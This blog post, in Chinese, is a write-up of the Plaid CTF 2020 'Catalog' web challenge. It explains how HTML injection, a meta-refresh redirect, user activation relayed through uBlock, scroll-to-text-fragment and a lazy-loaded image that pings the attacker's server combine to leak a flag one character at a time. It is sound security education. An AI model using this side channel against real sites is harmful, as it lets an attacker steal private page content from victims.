<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。
"><title>Plaid CTF 2020 Catalog</title>
<link rel=canonical href=https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Plaid CTF 2020 Catalog">
<meta property="og:description" content="本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。
">
<meta property="og:url" content="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2020-04-24T23:04:42+00:00"><meta property="article:modified_time" content="2020-04-24T23:04:42+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Plaid CTF 2020 Catalog">
<meta name=twitter:description content="本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。
">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>Plaid CTF 2020 Catalog</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Apr 24, 2020</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
15 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。</p>
<p>这道题是本次 PlaidCTF 全场唯一一道0解的题目，可以说是有一定的难度的，也比较有意思。这里非常感谢 @wupco @rebirthwyw @bks25wzsx（众所周知，@zsx 又名 @bks25wzsx）师傅们的指点，复盘的时候比较艰难，整个流程我会尽量用自己还算比较清晰的逻辑讲一下本道题，如果哪里有出错的还请师傅们多多包涵。</p>
<p>由于这个题是复盘题，所以做题思路可能会少一些，更多的是对于出题点以及exp一些分析什么的。</p>
<p>{% colorquote danger %}</p>
<p>5月6日更新：作者已经放出了他的 Write Up——<a class=link href=https://dttw.tech/posts/B19RXWzYL target=_blank rel=noopener>PlaidCTF 2020: Catalog Writeup</a> ，题目仓库—— <a class=link href=https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog target=_blank rel=noopener>catalog</a> ，文中内容可能与作者 Write Up 有些许出入，请以作者的 Write Up 为准！本文暂未更新！</p>
<p>{% endcolorquote %}</p>
<h2 id=information>Information</h2>
<blockquote>
<p><a class=link href=http://catalog.pwni.ng/ target=_blank rel=noopener>Here’s the site</a>. The flag is on <a class=link href="http://catalog.pwni.ng/issue.php?id=3" target=_blank rel=noopener>this page</a>.</p>
<p>Browser: Chromium <strong>with uBlock Origin 1.26.0 installed and in its default configuration</strong></p>
<p>Flag format: <code>/^PCTF\{[A-Z0-9_]+\}$/</code></p>
<p><strong>Hints</strong>:</p>
<ul>
<li>To view your post, the admin will click on a link on the admin page.</li>
<li>You might want to read up on User Activation.</li>
<li>The intended solution does not require you to submit hundreds of captchas.</li>
</ul>
<p>Hint: Admin Bot Timeout</p>
<p>The admin bot will always disconnect after about 30 seconds.</p>
</blockquote>
<p>给没有看题的小伙伴简略地概括一下题目，题目是个黑盒，有登录注册、发表 issue 、提交 issue 给 admin 看，主要是这些功能，很明显题目需要我们进行 XSS</p>
<p>其中有几个细节漏洞：</p>
<ol>
<li>
<p>登录失败的时候会直接无过滤地回显用户名，这里有一处 HTML 注入</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png loading=lazy>
</a>
</figure></p>
</li>
<li>
<p>在提交 issue 处，有一项需要提交 image URL 的地方也存在着 HTML 注入</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png loading=lazy>
</a>
</figure></p>
</li>
<li>
<p>题目设置还会利用 session 来存储一些 HTML 元素，例如我们在同一个 session 先登录，再用这个 session 发送一个登录失败的请求，刷新我们已登录的页面我们就可以看到：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png loading=lazy>
</a>
</figure></p>
</li>
</ol>
<h3 id=csp>CSP</h3>
<pre tabindex=0><code>Content-Security-Policy: default-src 'nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88'; img-src *; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/
</code></pre><p>题目给的 CSP 是这些，这些 CSP 限制了我们插入的代码执行，但是也很明显，这里并没有设置 base-uri ，所以我们可以试图利用 HTML 注入点，利用<code>&lt;base></code>来进行 XSS ，但是并不像 RCTF 2018 rblog 那道题，这道题的插入点在比较靠后的地方，没有办法控制之前引入文件的 url ，所以没有办法利用 base uri 的思路来进行 XSS</p>
<h2 id=exp>Exp</h2>
<blockquote>
<p>Catalog has two injections: the image tag on the issue page and the username when you fail to login. Use the image tag one with a meta redirect to get offsite. Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again. Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3. So now we have arbitrary content with a user activation on the correct page, but still no code exec. (&mldr;the rest of the exploit to come in a moment&mldr;)</p>
<p>(&mldr;continuation of previous post&mldr;) Ok, but what can we do? A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, <em>though this consumes the user activation</em>. If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the <code>&lt;em></code> tag gets split into a <code>&lt;span></code> for each individual letter on load! So you can do text searches of the form <code>#:~:text=F-,{,-X</code> for example to search for an X at the beginning of the flag. You can specify multiple text searches to do a binary search across the whole alphabet. Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha. Repeat 5 or 6 times to get the whole flag.</p>
</blockquote>
<p>这一段是赛后 @bluepichu 在 irc 上说的一段话，也算是对 catalog 这道题目的分析，也算是简短的 wp 。</p>
<p>同时，@lbherrera_ 在赛后发了一个推特公开了他一部分本题的 exp :</p>
<p>{% twitter <a class=link href=https://twitter.com/lbherrera_/status/1251994130298875904 target=_blank rel=noopener>https://twitter.com/lbherrera_/status/1251994130298875904</a> %}</p>
<p>Exp 地址在: <a class=link href=https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b target=_blank rel=noopener>https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b</a></p>
<p>但是比较遗憾的是，该作者到目前为止还并未发布他自己的 write up ，如果大家能看懂这些，那么这个题后面的部分大家就可以直接跳过了，后文也就是基本按照这个大致的思路来分析这个题的。</p>
<h3 id=user-activation>User Activation</h3>
<p><strong>这部分由于自己的理解也不是特别深刻，所以只是比较粗浅的个人理解，如有错误，还请师傅直接指出。</strong></p>
<p><strong>本部分参考主要是两个文档：<a class=link href=https://www.chromestatus.com/feature/5722065667620864 target=_blank rel=noopener>User Activation v2</a>、<a class=link href=https://mustaqahmed.github.io/user-activation-v2/ target=_blank rel=noopener>User Activation v2 (UAv2)</a>，如果师傅们对英文阅读理解比较好，更建议看原文</strong></p>
<p>&lsquo;User Activation&rsquo; 这个词看起来比较的关键，出现在了作者的解释以及 hint 当中，但是为什么作者放 hint 要特意给 &lsquo;User Activation&rsquo; 这个词而不是相对于更像通俗的 &lsquo;User Interaction&rsquo; 呢？</p>
<p>随便搜一下我们可以知道 &lsquo;User Activation&rsquo; 其实算是一个术语：</p>
<blockquote>
<p>​ User activation is the mechanism to maintain active-user-interaction state that limits use of &ldquo;abusable&rdquo; APIs (e.g. opening popups or vibrating).</p>
</blockquote>
<p>简而言之，User Activation(我们暂且称为“用户激活状态”)，是为了保持用户主动进行交互的状态，限制了一些被恶意使用的 API ，比如弹窗或者震动。&ldquo;激活 &ldquo;状态通常意味着用户当前通过某种输入机制（打字、点击鼠标等）与页面进行交互，或者用户在页面加载后完成了某种交互。</p>
<p>浏览器通过用户激活这种状态来控制对被恶意使用的 API 访问，这种 API 最明显的例子就是通过<code>window.open()</code>打开弹出窗口。当出现一些流氓开发者开始恶意使用该 API 任意弹窗后，大多数浏览器加入了在用户未主动与页面交互时阻止弹窗的功能，从那时起，浏览器逐渐使许多其他 API 依赖于用户激活（更准确地说，使它们受用户激活控制），比如全屏、震动，自动播放媒体等， Chrome 中约有30种不同的 API 由用户激活控制。</p>
<h3 id=ublock>uBlock</h3>
<blockquote>
<p>uBlock Origin (or uBlock₀) is not an <em>ad blocker</em>; it&rsquo;s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a class=link href=https://adblockplus.org/en/filters target=_blank rel=noopener>Adblock Plus filter syntax</a>. uBlock Origin <a class=link href=https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions target=_blank rel=noopener>extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a class=link href=https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny target=_blank rel=noopener>default-deny mode</a>, which mode will cause <a class=link href=https://requestpolicycontinued.github.io/#what-are-cross-site-requests target=_blank rel=noopener>all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p>
</blockquote>
<p>简单来说，uBlock 是一个通用的 blocker ，通过各种自定义规则来配合过滤页面元素，更多的可以到 <a class=link href=https://github.com/gorhill/uBlock target=_blank rel=noopener>uBlock</a> 仓库查看。</p>
<p><del>个人也并没有非常理解作者在此处引入 uBlock 的点，以及配合 User Activation 的出题意图，虽然作者解释了他的出题意图</del>：</p>
<blockquote>
<p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.</p>
</blockquote>
<p>就在我写这段话的时候我幡然醒悟，这个 uBlock 的引入对传递 User Activation 极为重要，为什么这么说呢？因为它对于我们接下里要引入的一个概念有着十分重要的联系！所以这里暂且我们把 uBlock + User Activation 的概念以及利用放一放，我们接下来看看怎么获取 flag 。</p>
<h3 id=how-to-get-the-flag>How to get the FLAG</h3>
<ol>
<li>存在 CSP 限制</li>
<li>Admin 会点击我们的 issue 链接</li>
<li>Flag 在同域的另一个页面：http://catalog.pwni.ng/issue.php?id=3</li>
</ol>
<p>我们可以由 1) 知道，一些利用 scirpt 的跳转就失效了，但是我们可以利用如下形式进行页面跳转：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;refresh&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;0;URL=&#39;http://url/&#39;&#34;</span> <span class=p>/&gt;</span>
</code></pre></div><p>我们可以利用的是两个 HTML 注入，而且 image url 处的注入还是存储型的。</p>
<p>假设如果允许我们执行 script 代码的话，我们可以利用两个 iframe ，一个 iframe 指向我们可以执行的 js 页面，另外一个 iframe 指向 flag 的页面，通过 js 来获取同域下的另一个 iframe 的内容，这也算是常用的 csrf 的一种操作，可以参考 Byte Bandits CTF 2020 - Notes App 的解法，这里就不再赘述了。</p>
<p>如果能插入 script 执行就好了，可惜插不得。</p>
<h3 id=text-fragments>Text Fragments</h3>
<p>反手看一手 Chrome 新特性，闷声发大财。</p>
<p>众所周知，CTF 出题人会有事没事去看看 php 源码 or chrome new features ，所以：<a class=link href=https://developers.google.com/web/updates/2020/02/nic80#more target=_blank rel=noopener>New in Chrome 80</a></p>
<blockquote>
<p>Of course, there’s plenty more!</p>
<ul>
<li>You can now link directly to text fragments on a page, by using <code>#:~:text=something</code>. Chrome will scroll to and highlight the first instance of that text fragment. For example [https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York](<a class=link href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New" target=_blank rel=noopener>https://en.wikipedia.org/wiki/Rickrolling#:~:text=New</a> York)</li>
</ul>
</blockquote>
<p>Scroll To Text Fragment: <a class=link href=https://chromestatus.com/feature/4733392803332096 target=_blank rel=noopener>https://chromestatus.com/feature/4733392803332096</a></p>
<blockquote>
<p>​ This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.</p>
</blockquote>
<p>简单来说，Chrome 在今年2月份的更新推出了一个新特性，这个特性能让我们用形如<code>#:~:text=something</code>的样式来滑动到该页面<code>something</code>字符串的位置，并将其高亮，赋予了字符串类似一个 anchor 锚标签的作用。</p>
<p>具体的使用师傅们可以参考文档 <a class=link href=https://wicg.github.io/ScrollToTextFragment/ target=_blank rel=noopener>Text Fragments</a> ，这里我只择取我们需要的来说：</p>
<ul>
<li>
<p>匹配模式：</p>
<pre tabindex=0><code>#:~:text=[prefix-,]textStart[,textEnd][,-suffix]
          context  |-------match-----|  context
</code></pre></li>
<li>
<p>前缀跟跟后缀只是为了限制上下文，真正匹配的还是中间的 textStart & textEnd</p>
</li>
<li>
<p>需要完整匹配一个单词，无法匹配单词中的单个字母。</p>
<blockquote>
<p>Example 12</p>
<p>“range” will match in “mountain range” but not in “color orange” nor “forest ranger”.</p>
</blockquote>
</li>
<li>
<p>单词需要在一个完整的块里面：</p>
<blockquote>
<p>Example 11</p>
<pre tabindex=0><code>:~:text=The quick,lazy dog
</code></pre><p>will fail to match in</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html>    <span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>The<span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span> <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>quick brown fox<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>jumped over the lazy dog<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</code></pre></div><p>because the starting string &ldquo;The quick&rdquo; does not appear within a single, uninterrupted block. The instance of &ldquo;The quick&rdquo; in the document has a block element between &ldquo;The&rdquo; and &ldquo;quick&rdquo;.</p>
<p>It does, however, match in this example:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html>    <span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>The quick brown fox<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>jumped over the lazy dog<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</code></pre></div></blockquote>
</li>
</ul>
<p>所以我们可以有个想法利用这个新特性去匹配到 flag ，但是一系列的问题来了：</p>
<ul>
<li>如果 flag 是 PCTF{TEST} ，我们用<code>#:~:text=P-,C,T,-F</code>是匹配不到的，因为它不能匹配到单词的单个字母</li>
<li>即使我们能匹配到了，怎么样判断我们匹配到了呢？</li>
</ul>
<h3 id=lettering>Lettering</h3>
<p>按照上述思路，我们貌似得找个办法拆分这个字符串，其实出题人已经很贴心地为我们做好了：</p>
<p>这是页面所引入的文件：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js&#34;</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js&#34;</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&#34;</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/js/main.js&#34;</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</code></pre></div><p>其中引入了 jquery.lettering.min.js ，并且 main.js 有如下代码</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>$</span><span class=p>(</span><span class=s2>&#34;em&#34;</span><span class=p>).</span><span class=nx>lettering</span><span class=p>();</span>
</code></pre></div><p>我们可以在 lettering.js 的文档中看到 <a class=link href=https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering%28%29 target=_blank rel=noopener>Lettering.js wiki - Wrapping letters with lettering()</a></p>
<blockquote>
<p>We&rsquo;ll start with some really basic markup:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>h1</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;fancy_title&#34;</span><span class=p>&gt;</span>Some Title<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</code></pre></div><p>After including jQuery, <a class=link href=http://github.com/davatron5000/Lettering.js/downloads target=_blank rel=noopener>download and include the latest minified version of Lettering.js</a>, then a script block with the magical <code>.lettering()</code> method:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;path/to/jquery.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;path/to/jquery.lettering.min.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=nx>$</span><span class=p>(</span><span class=nb>document</span><span class=p>).</span><span class=nx>ready</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
  <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;.fancy_title&#34;</span><span class=p>).</span><span class=nx>lettering</span><span class=p>();</span>
<span class=p>});</span>
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</code></pre></div><p>The resulting code will churn your <code>.fancy_title</code> and output the following:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>h1</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;fancy_title&#34;</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char1&#34;</span><span class=p>&gt;</span>S<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char2&#34;</span><span class=p>&gt;</span>o<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char3&#34;</span><span class=p>&gt;</span>m<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char4&#34;</span><span class=p>&gt;</span>e<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char5&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char6&#34;</span><span class=p>&gt;</span>T<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char7&#34;</span><span class=p>&gt;</span>i<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char8&#34;</span><span class=p>&gt;</span>t<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char9&#34;</span><span class=p>&gt;</span>l<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;char10&#34;</span><span class=p>&gt;</span>e<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</code></pre></div></blockquote>
<p>所以我们只需要在页面加入一个<code>&lt;em></code>标签，即可把内容拆分为单个字母，效果如下：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png loading=lazy>
</a>
</figure></p>
<p>所以这时候我们就可以利用<code>#:~:text=P-,C,T,-F</code>进行选中了。</p>
<h3 id=spark-thinking>Spark Thinking</h3>
<p>那么如何判断我们是否选中了呢？</p>
<p>这里 Exp 作者很聪明地想到了一个办法：</p>
<ul>
<li>利用我们在 information 段提到的同一 session 会存储一定的 HTML 元素，所以即使登录状态下，我们也可以利用 fetch no-cors 来更新界面，利用登录失败在另一个同一 session 的界面得到无过滤的 HTML 注入</li>
<li>利用这个登录失败的 HTML 注入创造判断条件：注入足够多的<code>&lt;br></code>标签，让 FLAG 位于用户视窗页面之外，并在<code>&lt;br></code>的最后加入一个图片，利用图片懒加载来确定 Text Fragments 是否匹配到了 FLAG</li>
<li>一开始因为图片被放置到了用户视窗之外并且由于图片懒加载，图片并不会请求对应的资源，这时如果<code>#:~:text=P-,C,T,-F</code>匹配到了，因为我们注入的<code>&lt;br></code>标签的原因，页面会先进行滚动到 FLAG 的位置，这时候，图片才会加载对应的资源，所以我们就可以利用图片懒加载来确定匹配成功；如果匹配不成功的话，就不会请求对应的资源</li>
<li>所以这时我们只需要利用自己的 vps 监听一个端口让懒加载的图片在触发请求时，请求我们的 vps 就可以判断是否匹配成功了</li>
</ul>
<p>{% colorquote info %}</p>
<p>Note:</p>
<blockquote>
<p>Support the ‘loading’ attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on <code>&lt;iframe></code> and <code>&lt;img></code> elements.</p>
</blockquote>
<p>也就是说只有当用户窗口页面内关注到<code>&lt;img></code>标签时，该标签才能加载对应的资源。我们可以使用<code>&lt;img></code>原生属性<code>loading=lazy</code>来实现，Chrome 76以后的版本都已实现了该功能——<a class=link href=https://chromestatus.com/feature/5645767347798016 target=_blank rel=noopener>Lazily load iframes and images via ‘loading’ attribute</a></p>
<p>{% endcolorquote %}</p>
<p>至此，基本上比较关键的地方我们都说完了，剩下的就是实现以及一些细节的地方了。</p>
<h3 id=ublock--user-activation--text-fragments>uBlock & User Activation & Text Fragments</h3>
<p>这时我们再来回头看 uBlock & User Activation 在整个过程起到了什么作用呢？</p>
<p>因为 Chrome 80 引入了 Text Fragments 的机制，综上我们的分析利用可以产生一个新的攻击面，用这种“侧信道”的攻击方式我们可以窃取用户隐私，所以当然出于隐私考虑， Google 也引入了相对的限制机制：</p>
<blockquote>
<p>The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a &ldquo;noopener&rdquo; context, such that the destination page is known to be sufficiently isolated.</p>
</blockquote>
<p>我们可以注意到其中非常关键的一句话： <em>**In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. **</em></p>
<p>也就是说 Text Fragments 功能仅在由于 User Activation 产生的完整导向上才能生效，没有 User Activation 是无法使用该功能的！在其他地方我们也可以看到 Google 对于 **User Activation ** 做了很多的强调：</p>
<blockquote>
<p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</p>
</blockquote>
<p><em><strong>For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></em></p>
<p>因此，基于 User Activation 和浏览上下文隔离的限制非常重要，必须予以实施。</p>
<p>至于 Chrome 如何实现限制该功能的，具体可以参考文档 <a class=link href=https://wicg.github.io/ScrollToTextFragment/#restricting-the-text-fragment target=_blank rel=noopener>Restricting the Text Fragment</a> ，这里就不详述了。</p>
<p>从以上来看，出题人的题图就很明显了：</p>
<blockquote>
<p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.</p>
</blockquote>
<p>并且根据 <a class=link href=https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/ target=_blank rel=noopener>User Activation v2 in Chrome</a> ：</p>
<blockquote>
<p>Full-overlay request from subframes: To grant a subframe’s full-overlay request (sent through a postMessage), the main frame will check the subframe’s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage’s <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage target=_blank rel=noopener>event source</a> parameter.</p>
</blockquote>
<p>两者结合在一起可能就比较容易理解了，<strong>以下是个人根据文档理解，并没有参考研究具体代码实现，如果有师傅根据代码研究出结果与我的理解有什么出入，那一定是我错了</strong>：</p>
<p>个人理解：管理员单击一个我们提交打的链接，将消耗一个用户激活打开链接，而 uBlock 将 <code>postMessage</code> 发送到其扩展 iframe ，从而复制用户激活。 每当页面加载时，前端都会从 uBlock 框架获取 postMessage ，从而再次将激活复制回去。</p>
<p>我们可以从 <a class=link href=#Verification>Verification</a> 看到关于 uBlock 传递 User Activation 的验证。</p>
<h3 id=regex>Regex</h3>
<p>因为 FLAG 正则为 <code>/^PCTF\{[A-Z0-9_]+\}$/</code>，我们每次用 Text Fragments 只能验证一个字符，例如我们可以构造如下 url ，一次可以匹配完全部的符合正则的字符，A-Z0-9_ 外加一个 } 为 FLAG 闭合的字符</p>
